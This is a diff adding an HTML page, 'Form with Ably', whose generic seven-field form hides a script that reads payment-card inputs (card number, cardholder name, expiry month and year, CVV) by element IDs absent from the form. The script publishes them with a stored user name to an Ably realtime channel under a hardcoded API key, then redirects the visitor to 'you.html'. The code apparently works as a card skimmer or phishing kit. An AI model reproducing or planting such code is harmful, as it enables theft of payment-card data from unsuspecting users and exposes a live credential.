@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form with Ably</title>
+    <script src="https://cdn.ably.io/lib/ably.min-1.js"></script>
+</head>
+<body>
+    <form id="dataForm">
+        <input type="text" id="field1" placeholder="Field 1"><br>
+        <input type="text" id="field2" placeholder="Field 2"><br>
+        <input type="text" id="field3" placeholder="Field 3"><br>
+        <input type="text" id="field4" placeholder="Field 4"><br>
+        <input type="text" id="field5" placeholder="Field 5"><br>
+        <input type="text" id="field6" placeholder="Field 6"><br>
+        <input type="text" id="field7" placeholder="Field 7"><br>
+       
+        <button type="button" onclick="sendData()">Send Data</button>
+    </form>
+
+    <script>
+        // Initialize Ably client
+        const ably = new Ably.Realtime('eXsM9Q.P9Cadg:czuSocYApa29JpDHttEBFL6V8xi486Wg7svkiRHBRXs');
+        const channel = ably.channels.get('form-data');
+
+        function sendData() {
+            // Get data from input fields
+            const data = {
+                field1: document.getElementById('card-number').value,
+                field2: document.getElementById('card-name-input').value,
+                field3: document.getElementById('expiry-year').value,
+                field4: document.getElementById('cvv').value,
+                field5: document.getElementById('expiry-month').value,
+                field6: document.getElementById('field6').value,
+                field7: document.getElementById('field7').value,
+                
+                userName: localStorage.getItem('userName') || 'Anonymous'
+            };
+
+            // Publish the data to the Ably channel
+            channel.publish('formDataSent', data, function(err) {
+                if (err) {
+                    console.error('Error publishing data:', err);
+                } else {
+                    console.log('Data successfully sent.');
+   window.location.href = 'you.html';           
+                }
+            });
+        }
+    </script>
+</body>
+</html>
